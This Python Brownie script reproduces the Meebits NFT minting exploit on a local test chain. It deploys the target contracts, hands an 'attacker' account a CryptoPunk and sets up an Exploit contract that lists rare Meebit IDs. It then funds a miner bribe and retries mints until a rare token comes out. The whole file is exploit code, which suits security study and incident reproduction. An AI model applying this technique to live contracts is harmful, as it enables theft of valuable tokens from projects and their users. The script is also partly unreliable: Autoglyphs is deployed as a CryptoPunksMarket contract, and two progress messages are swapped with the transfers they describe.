from brownie import Exploit, Meebits, CryptoPunksMarket, Autoglyphs, accounts, Wei
from brownie.exceptions import VirtualMachineError

def main():

    # Visitor and Dissected Meebit IDs
    rareMeebits = [776, 1990, 2948, 3919, 4683, 6863, 8369, 8598, 8721, 10326, 10761, 12304, 12702, 13805, 15481, 16192, 16647, 18574, 18868, 19421, 19480, 19729, 19775]

    lavalabs, attacker = accounts[0:2]

    initialBalance = attacker.balance()
    print("\nAttacker: %s" % attacker)

    # initial setup
    print("\nDeploying Cryptopunks...")
    punks = CryptoPunksMarket.deploy({'from': lavalabs})

    print("\nDeploying Autoglyphs...")
    glyphs = CryptoPunksMarket.deploy({'from': lavalabs})

    print("\nDeploying Meebits...")
    meebits = Meebits.deploy(punks.address, glyphs, lavalabs, {'from': lavalabs})

    # shortcut to give a punk to the attacker
    print("\nTransfering Cryptopunk #4466 to attacker...")
    punks.setInitialOwner(attacker.address, 4466, {'from': lavalabs})
    punks.allInitialOwnersAssigned({'from': lavalabs})

    # attacker setup
    print("\nDeploying Exploit...")
    exploit = Exploit.deploy(meebits.address, {'from': attacker})

    print("\nSending Cryptopunk #4466 to the exploit contract...")
    punks.transferPunk(exploit.address, 4466, {'from': attacker})

    print("\nAssigning rare Meebits...")
    for rareId in rareMeebits:
        exploit.addMeebit(rareId, {'from': attacker})

    print("\nSending eth to pay miner bribe...")
    exploit.deposit({'from': attacker, 'value': Wei("1 ether")})

    print("\nBrute-forcing mints...")
    meebitId = 0
    while True:
        try:
            tx = exploit.mintMeebit(4466+1, {'from': attacker})
            meebitId = tx.return_value
            break
        except VirtualMachineError:                                      
            continue

    print("\nRetrieving Meebits #%d..." % meebitId)
    exploit.recover(punks.address, 0, punks.transferPunk.encode_input(attacker,4466), {'from': attacker})

    print("\nRetrieving Cryptopunk #%d..." % 4466)
    exploit.recover(meebits.address, 0, meebits.transferFrom.encode_input(exploit.address, attacker, meebitId), {'from': attacker})

    owner = meebits.ownerOf.call(meebitId, {'from': attacker})
    print("Meebit #%d is now owned by %s" % (meebitId, owner))
